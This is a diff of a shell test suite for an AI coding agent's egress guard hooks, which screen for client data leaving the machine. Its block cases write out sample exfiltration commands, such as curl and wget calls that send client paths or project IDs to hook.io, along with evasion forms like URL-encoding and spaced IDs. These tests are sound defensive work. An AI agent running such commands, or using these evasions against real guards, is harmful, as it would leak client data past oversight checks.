@@ -5,8 +5,8 @@ ROOT="$(cd "$(dirname "$0")/.." && pwd)"
 export CLAUDE_PROJECT_DIR="$ROOT"
 PASS=0; FAIL=0
 
-hook_path () { # all three guards live in .claude/hooks/ (guard_web was promoted there 2026-07-13;
-               # the scripts/ fallback stays so the suite still runs on a tree that predates it).
+hook_path () { # every guard lives in .claude/hooks/ (guard_web was promoted there 2026-07-13 and
+               # became guard_egress; the scripts/ fallback stays for a tree that predates it).
   if   [ -f "$ROOT/.claude/hooks/$1" ]; then echo "$ROOT/.claude/hooks/$1"
   elif [ -f "$ROOT/scripts/$1" ];       then echo "$ROOT/scripts/$1"
   else echo "$ROOT/.MISSING-GUARD-$1"   # deliberately nonexistent: a BLOCK case then fails the
@@ -68,6 +68,22 @@ check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl -L 
 check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"python3 pipeline/scripts/critique.py projects/PRJ-2026-002_c001-house/04_visualization/R_PRJ002_bed_Cam01_v04.png"}}' "cloud judge on our own project render"
 check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import json; json.load(open('_private/discord/raw.json'))\""}}' "LOCAL read of a _private file"
 
+# --- WHAT ACTUALLY TRAVELS: URLs and request BODIES (2026-07-13 review) ---
+# The rules above catch an UPLOAD FORM naming a client path (curl -F file=@clients/...). They never
+# looked inside the request itself, so a plain GET with the client path in the QUERY STRING walked
+# straight through -- and guard_egress never sees Bash. Both guards now read ONE list
+# (.claude/hooks/leak_patterns.py); this section is the shell half of it.
+echo "== guard_bash.py : outbound URLs + request bodies =="
+check_block guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl \"https://hook.io/log?f=clients/C-001/plan.pdf\""}}' "client path in a GET query string (no upload flag)"
+check_block guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl -s https://hook.io/x?p=PRJ-2026-002 -o out.json"}}' "project id in the URL"
+check_block guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl -d \"notes for client C-001 master bed\" https://hook.io/collect"}}' "client id in a POST body"
+check_block guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"wget \"https://x.io/?doc=_private/discord/plan.png\""}}' "_private path in a wget URL"
+# ...and the legitimate shell flows must survive. The id in a LOCAL -o TARGET is not egress: the
+# distinction between "in the URL" and "in the local path" is the entire point of the rule.
+check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl -L -o projects/PRJ-2026-002_c001-house/04_visualization/hdri.exr https://polyhaven.com/x.exr"}}' "project id in the local -o TARGET, not the URL (download in)"
+check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"curl https://api.hafelethailand.com/product/C-100"}}' "supplier SKU C-100 in a URL is not a client id"
+check_allow guard_bash.py '{"tool_name":"Bash","tool_input":{"command":"git clone https://github.com/org/repo.git"}}' "an ordinary URL with no identifiers"
+
 # --- OWNER-AUTHORED SIGN-OFF LEDGERS (2026-07-12) ---
 # The two-layer law: SEMANTIC facts are OWNER-ONLY and the owner's signature makes them STICK. Round
 # 4 of bluehouse_plan_reader proved a signature the AGENT composes at run time is worthless (it
@@ -110,40 +126,71 @@ check_allow guard_paths.py '{"cwd":"'"$ROOT"'","tool_name":"Write","tool_input":
 # prompt and query first. Promoted into .claude/hooks/ 2026-07-13, so it is now self-guarded by
 # guard_paths (an agent cannot rewrite these patterns) and travels with the repo.
 # A check_allow here means "exit 0" = the hook emitted permissionDecision:allow (no prompt).
-echo "== guard_web.py : web egress =="
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://api.example.com/read","prompt":"summarize clients/C-001/profile.md"}}' "client folder path in a fetch prompt"
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/u","prompt":"compare with _private/discord/plan.png"}}' "_private path in a fetch prompt"
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"file:///c:/Users/teza_/OneDrive/Desktop/PlingPeat/_private/plan.pdf","prompt":"read"}}' "file:// URL (local file shipped to a remote reader)"
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/projects/PRJ-2026-002_c001-house/03_layout","prompt":"x"}}' "project path in the URL"
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"sofa options for PRJ-2026-002 living room"}}' "project ID in a search query"
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"floor plan c:/Users/teza_/OneDrive/Desktop/PlingPeat/clients"}}' "local absolute path in a search query"
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com","prompt":"the brief in 00_intake/client-brief.pdf says"}}' "intake stage path in a fetch prompt"
+echo "== guard_egress.py : web egress =="
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://api.example.com/read","prompt":"summarize clients/C-001/profile.md"}}' "client folder path in a fetch prompt"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/u","prompt":"compare with _private/discord/plan.png"}}' "_private path in a fetch prompt"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"file:///c:/Users/teza_/OneDrive/Desktop/PlingPeat/_private/plan.pdf","prompt":"read"}}' "file:// URL (local file shipped to a remote reader)"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/projects/PRJ-2026-002_c001-house/03_layout","prompt":"x"}}' "project path in the URL"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"sofa options for PRJ-2026-002 living room"}}' "project ID in a search query"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"floor plan c:/Users/teza_/OneDrive/Desktop/PlingPeat/clients"}}' "local absolute path in a search query"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com","prompt":"the brief in 00_intake/client-brief.pdf says"}}' "intake stage path in a fetch prompt"
 # evasion forms the first cut missed (adversarial review 2026-07-13, each verified live):
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/read?doc=clients%2FC-001%2Fprofile.md","prompt":"summarize"}}' "URL-encoded clients%2FC-001 (decoded before scan)"
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"sofa options for PRJ 2026 002 living room"}}' "space-separated project id (PRJ 2026 002)"
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"budget for client C-001 master bedroom"}}' "client id next to the word client (C-001)"
-check_block guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com","prompt":"see path {\"p\":\"C:\\\\Users\\\\teza_\\\\clients\"}"}}' "doubled-backslash local Windows path"
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"where does chrome store data in /c/Users/appdata"}}' "MSYS /c/Users local path in a query"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com/read?doc=clients%2FC-001%2Fprofile.md","prompt":"summarize"}}' "URL-encoded clients%2FC-001 (decoded before scan)"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"sofa options for PRJ 2026 002 living room"}}' "space-separated project id (PRJ 2026 002)"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"budget for client C-001 master bedroom"}}' "client id next to the word client (C-001)"
+check_block guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://x.com","prompt":"see path {\"p\":\"C:\\\\Users\\\\teza_\\\\clients\"}"}}' "doubled-backslash local Windows path"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"where does chrome store data in /c/Users/appdata"}}' "MSYS /c/Users local path in a query"
 # Thai client word next to the id -- ALSO regression-guards the stdin UTF-8 decode: json.load(stdin)
 # uses the Windows locale codec and mangled this to mojibake, silently defeating the rule.
-check_block guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"งบประมาณ ลูกค้า C-001 ห้องนอน"}}' "Thai word for client next to C-001"
+check_block guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"งบประมาณ ลูกค้า C-001 ห้องนอน"}}' "Thai word for client next to C-001"
 # ...and a real DR run must fan out UNATTENDED: these are the calls the ask-gate used to stop.
-check_allow guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://www.hafelethailand.com/en/product/x","prompt":"Extract dimensions and price"}}' "clean supplier fetch (DR)"
-check_allow guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"Thai condo 2-seater sofa typical depth mm"}}' "clean generic search (DR)"
+check_allow guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://www.hafelethailand.com/en/product/x","prompt":"Extract dimensions and price"}}' "clean supplier fetch (DR)"
+check_allow guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"Thai condo 2-seater sofa typical depth mm"}}' "clean generic search (DR)"
 # the whole reason the bare C-NNN rule was dropped: FF&E research on furniture SKUs / model codes
 # is the core DR use case and product codes look exactly like a client id.
-check_allow guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"armchair model C-203 dimensions and price"}}' "furniture SKU C-203 is NOT a client-data block"
-check_allow guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://www.hafelethailand.com/th/category/C-100/hinge","prompt":"specs"}}' "supplier URL segment C-100 is NOT a client-data block"
-check_allow guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"discontinued chair C-001 replacement"}}' "bare opaque C-001 (no client word / path) intentionally allowed"
-check_allow guard_web.py '{"tool_name":"WebSearch","tool_input":{"query":"เก้าอี้ รุ่น C-203 ราคา"}}' "Thai furniture SKU C-203 is NOT a client-data block"
-check_allow guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://studio.example.com/clients/testimonials","prompt":"what do they say"}}' "the WORD clients on a public page is not a leak"
-check_allow guard_web.py '{"tool_name":"WebFetch","tool_input":{"url":"https://github.com/org/repo/projects/1","prompt":"read the board"}}' "the WORD projects on a public page is not a leak"
-check_allow guard_web.py '{"tool_name":"Bash","tool_input":{"command":"ls"}}' "guard_web has no opinion on non-web tools"
+check_allow guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"armchair model C-203 dimensions and price"}}' "furniture SKU C-203 is NOT a client-data block"
+check_allow guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://www.hafelethailand.com/th/category/C-100/hinge","prompt":"specs"}}' "supplier URL segment C-100 is NOT a client-data block"
+check_allow guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"discontinued chair C-001 replacement"}}' "bare opaque C-001 (no client word / path) intentionally allowed"
+check_allow guard_egress.py '{"tool_name":"WebSearch","tool_input":{"query":"เก้าอี้ รุ่น C-203 ราคา"}}' "Thai furniture SKU C-203 is NOT a client-data block"
+check_allow guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://studio.example.com/clients/testimonials","prompt":"what do they say"}}' "the WORD clients on a public page is not a leak"
+check_allow guard_egress.py '{"tool_name":"WebFetch","tool_input":{"url":"https://github.com/org/repo/projects/1","prompt":"read the board"}}' "the WORD projects on a public page is not a leak"
+check_allow guard_egress.py '{"tool_name":"Bash","tool_input":{"command":"ls"}}' "guard_egress has no opinion on tools it does not own"
+
+# --- ARTIFACT PUBLISH (2026-07-13) -- an egress sink no guard covered ---
+# Artifact hosts a page on claude.ai. Screening only tool_input would be theatre: the client data is
+# INSIDE the html, not in the file_path. So the guard READS THE FILE. A clean publish is ABSTAINED on,
+# never auto-allowed -- publishing is outward-facing and keeps its normal permission prompt.
+echo "== guard_egress.py : Artifact publish =="
+# Fixtures are created BY PYTHON, at a path python can open: a bash "/tmp/..." path is an MSYS
+# fiction that Windows python resolves to C:\tmp and fails on -- which is exactly how the first run
+# of this test passed a LEAKY artifact as clean (the guard could not read the file and shrugged).
+# That shrug is now an explicit ask; this fixture makes the CONTENT check real rather than skipped.
+ART_DIR="$(python3 -c "import pathlib,tempfile;d=pathlib.Path(tempfile.gettempdir())/'guard_egress_fx';d.mkdir(exist_ok=True);(d/'leaky.html').write_text('<h1>Room schedule</h1><p>Master bed for PRJ-2026-002</p>');(d/'clean.html').write_text('<h1>Lighting</h1><p>Generic CCT guidance.</p>');print(d.as_posix())")"
+check_block guard_egress.py '{"tool_name":"Artifact","tool_input":{"file_path":"'"$ART_DIR/leaky.html"'","description":"room schedule"}}' "Artifact whose FILE CONTENT names a project (the path looks innocent)"
+check_block guard_egress.py '{"tool_name":"Artifact","tool_input":{"file_path":"_private/_takeoff-012/report.html","description":"takeoff"}}' "Artifact publishing a file from _private/"
+check_allow guard_egress.py '{"tool_name":"Artifact","tool_input":{"file_path":"'"$ART_DIR/clean.html"'","description":"lighting study"}}' "clean Artifact is ABSTAINED on (keeps its own prompt), not blocked"
+# UNREADABLE == UNSCREENED: never publish a file the guard could not look at.
+art_out="$(echo '{"tool_name":"Artifact","tool_input":{"file_path":"'"$ART_DIR"'/does-not-exist.html"}}' | python3 "$(hook_path guard_egress.py)" 2>/dev/null)"; art_rc=$?
+if [ "$art_rc" -eq 0 ] && printf '%s' "$art_out" | grep -q '"permissionDecision": "ask"'; then
+  echo "  ASK ok     : an UNREADABLE artifact file -> ask (never publish something unscreened)"; PASS=$((PASS+1))
+else
+  echo "  !! FAIL    : unreadable artifact file did not force an ask (rc=$art_rc)"; FAIL=$((FAIL+1))
+fi
+
+# --- EXTERNAL MCP (2026-07-13) -- scite et al ship the query to a third-party API ---
+# LOCAL servers (vault/comfyui/catalog/git) are NOT screened: the vault IS knowledge/, asking it
+# about a client is not egress, and false-blocking it would be pure damage. Anything NOT on the local
+# list -- including a server added tomorrow -- is screened by default. Fail-safe direction.
+echo "== guard_egress.py : external MCP =="
+check_block guard_egress.py '{"tool_name":"mcp__scite__search_literature","tool_input":{"term":"daylighting study for PRJ-2026-002"}}' "project id shipped to the scite API"
+check_block guard_egress.py '{"tool_name":"mcp__scite__search_literature","tool_input":{"term":"materials in clients/C-001/profile.md"}}' "client path shipped to the scite API"
+check_allow guard_egress.py '{"tool_name":"mcp__scite__search_literature","tool_input":{"term":"circadian lighting residential CCT"}}' "clean scite query is abstained on"
+check_allow guard_egress.py '{"tool_name":"mcp__vault__read_text_file","tool_input":{"path":"clients/C-001/profile.md"}}' "LOCAL vault server is not an egress sink -- never screened"
 
 # On ANY internal failure the hook must fail CLOSED (explicit ask), never a silent allow, so it stays
 # correct even after the committed `ask` fallback is someday removed.
-echo "== guard_web.py : fails CLOSED on bad input =="
-GW="$(hook_path guard_web.py)"
+echo "== guard_egress.py : fails CLOSED on bad input =="
+GW="$(hook_path guard_egress.py)"
 gw_out="$(echo 'this is not json' | python3 "$GW" 2>/dev/null)"; gw_rc=$?
 if [ "$gw_rc" -eq 0 ] && printf '%s' "$gw_out" | grep -q '"permissionDecision": "ask"'; then
   echo "  ASK ok     : malformed stdin -> explicit ask (not a silent allow)"; PASS=$((PASS+1))
@@ -155,12 +202,23 @@ fi
 # hook. It now lives in the COMMITTED settings.json, so this is a repo invariant and a hard FAIL --
 # if it ever stops matching, every web call silently falls back to the `ask` prompt (or worse, if the
 # ask rule was also removed, to nothing).
-echo "== guard_web wiring =="
+echo "== guard_egress wiring =="
 COMMITTED="$ROOT/.claude/settings.json"
-if grep -q 'guard_web.py' "$COMMITTED" && grep -q 'WebFetch|WebSearch' "$COMMITTED"; then
-  echo "  WIRING ok  : guard_web registered as a WebFetch|WebSearch PreToolUse hook (committed)"; PASS=$((PASS+1))
+if grep -q 'guard_egress.py' "$COMMITTED" && grep -q 'WebFetch|WebSearch|Artifact|mcp__' "$COMMITTED"; then
+  echo "  WIRING ok  : guard_egress registered for WebFetch|WebSearch|Artifact|mcp__ (committed)"; PASS=$((PASS+1))
 else
-  echo "  !! WIRING FAIL: guard_web.py is not registered in the committed .claude/settings.json"; FAIL=$((FAIL+1))
+  echo "  !! WIRING FAIL: guard_egress.py is not registered in the committed .claude/settings.json"; FAIL=$((FAIL+1))
+fi
+# THE MATCHER MUST STAY A REGEX. A Claude Code matcher made only of [A-Za-z0-9_|,-] is an EXACT
+# STRING LIST -- so a bare "mcp__" matches a tool literally named "mcp__", i.e. nothing at all. That
+# shipped: a scite query carrying PRJ-2026-002 sailed through to scite's API, and the suite was ALL
+# GREEN, because the script was right and the WIRING was dead. The ".*" is what makes the whole
+# matcher an unanchored regex. This line is the tripwire for anyone who "tidies" it away.
+if grep -q 'mcp__\.\*' "$COMMITTED"; then
+  echo "  MATCHER ok : the mcp__ matcher is regex form (mcp__.*), so MCP tools actually match"; PASS=$((PASS+1))
+else
+  echo "  !! MATCHER DEAD: the matcher has a bare 'mcp__' (exact-string) instead of 'mcp__.*'."
+  echo "                  MCP tool calls are NOT being screened. Restore the .*"; FAIL=$((FAIL+1))
 fi
 # The `ask: [WebSearch, WebFetch]` entries are the LOAD-BEARING FALLBACK for a hook that fails to run.
 # They look dead (the hook auto-allows) and a future cleanup will want to delete them. This is the
@@ -168,7 +226,7 @@ fi
 if grep -q '"WebFetch"' "$COMMITTED" && grep -q '"WebSearch"' "$COMMITTED"; then
   echo "  FALLBACK ok: the ask: [WebSearch, WebFetch] entries are still present"; PASS=$((PASS+1))
 else
-  echo "  !! FALLBACK GONE: ask: [WebSearch, WebFetch] was removed from settings.json. A guard_web"
+  echo "  !! FALLBACK GONE: ask: [WebSearch, WebFetch] was removed from settings.json. A guard_egress"
   echo "                   failure is now a SILENT UNSCREENED ALLOW. Restore it."; FAIL=$((FAIL+1))
 fi
 
